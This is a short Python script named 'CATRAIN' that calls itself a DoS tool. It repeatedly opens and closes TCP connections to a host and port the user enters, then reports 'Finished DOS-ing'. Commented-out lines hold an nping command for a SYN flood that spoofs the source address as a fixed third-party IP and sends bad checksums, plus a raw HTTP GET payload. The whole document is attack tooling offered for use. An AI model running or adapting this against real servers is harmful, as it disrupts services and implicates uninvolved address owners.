print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<"); 

#! prev version (https://github.com/LmaosDev/lmaoscripts/releases/tag/catrain-pre-1.1) and unused material for a potential next version: 
#try: subprocess.check_output("nmap", shell=True).decode(); ip = input("ip: > "); count = input("count: > "); rate = input("rate: > "); print(subprocess.check_output(f'nping -N -c {count} --rate {rate} --tcp {ip} --flags SYN --ttl 12 --safe-payloads -S 35.76.98.241 --tr --badsum', shell=True).decode()) 
#except Exception as e: input("\nListen...\n\n>>>\tYou're gonna have to install nping/nmap/npcap/usbpcap/zenmap first.\n\n\n\tGot it?\n\n Process raised Error:" + str(e) + "\n\t> ") 
# 
#match str(input("Connection type: HTTP(HTML)/SYN: > ")).lower:
#    case "html"|"http": p="HTML GET"; # HTML GET 
#    case "syn": p="SYN"; # SYN 
#if p == "syn":
#    msg = 0x02; port = input("\tPort:\t\tdefault: None\t> ") 
#else:msg = 0x474554202f20485454502f312e300d0a0d0a; 


from socket import socket,AF_INET,SOCK_STREAM#; p = ""; import datetime 
try: ip = input("Server hostname or IP:\tdefault: ::\t> ") or "127.0.0.1"; count = input("Count:\t\t\tdefault:  3\t> ") or 3 
except Exception as e: input(("Exception raised:", e)) 
port = input("\tPort:\t\tdefault: 80\t> ") or "80"   
input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nContinue? ^C to cancel > ") # type: ignore 

ec = 0
if port != "" or None:
    for i in range(int(count)): # type: ignore 
        #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
        sock = socket(AF_INET, SOCK_STREAM) 
        try: sock.connect((ip, int(port))); sock.close(); print("CONN/DISC no. ", i+1)  # type: ignore 
        except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1 
else:
    for i in range(int(count)): # type: ignore 
        #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
        sock = socket(AF_INET, SOCK_STREAM) 
        try: sock.connect((ip)); sock.close(); print("CONN/DISC no. ", i+1)  # type: ignore 
        except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1 
input(f"\nFinished DOS-ing\nSTATS:\nConnections attempted:\tConnections succeded:\n{count}\t\t\t{int(count)-ec}\n") # type: ignore 
